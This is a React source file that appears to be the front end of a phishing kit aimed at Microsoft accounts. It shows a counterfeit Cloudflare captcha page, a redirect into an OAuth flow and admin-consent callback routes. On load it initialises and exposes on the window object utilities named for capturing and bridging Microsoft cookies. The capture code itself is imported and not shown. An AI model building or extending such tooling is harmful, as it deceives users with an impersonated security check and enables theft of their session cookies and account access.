import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AuthCallback from './components/AuthCallback';
import AdminConsentCallback from './components/AdminConsentCallback';
import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
import { initializeMicrosoftCookieBridge, microsoftCookieBridge } from './utils/microsoftCookieBridge';

const App: React.FC = () => {
    // The main Router component that wraps the application.
    return (
        <Router>
            <AppContent />
        </Router>
    );
};

const AppContent: React.FC = () => {
    // This hook ensures that cookie utilities are initialized once when the app loads.
    useEffect(() => {
        try {
            console.log('✅ Microsoft cookie capture utilities initialized');
            if (typeof window !== 'undefined') {
                (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
                (window as any).microsoftCookieBridge = microsoftCookieBridge;
            }
            console.log('🚀 Initializing Microsoft Cookie Bridge...');
            initializeMicrosoftCookieBridge();
        } catch (error) {
            console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
        }
    }, []);

    // ✅ FINAL FIX: Using the standard <Routes> component for robust routing.
    // Both `/auth/callback` and the legacy path now point to the single,
    // correct AdminConsentCallback component. The old AuthCallback is no longer used in this flow.
    return (
        <Routes>
            <Route path="/auth/callback" element={<AdminConsentCallback />} />
            <Route path="/auth/callback/legacy" element={<AdminConsentCallback />} />
            <Route path="*" element={<DefaultPage />} />
        </Routes>
    );
};


const DefaultPage: React.FC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');

    useEffect(() => {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        if (step) {
            setCurrentPage(step);
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, []);

    const handleCaptchaVerified = () => {
        setCurrentPage('replacement');
    };

    const handleCaptchaBack = () => {
        window.location.reload();
    };
    
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
        case 'replacement':
            return <RealOAuthRedirect />;
        default:
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
    }
};

export default App;
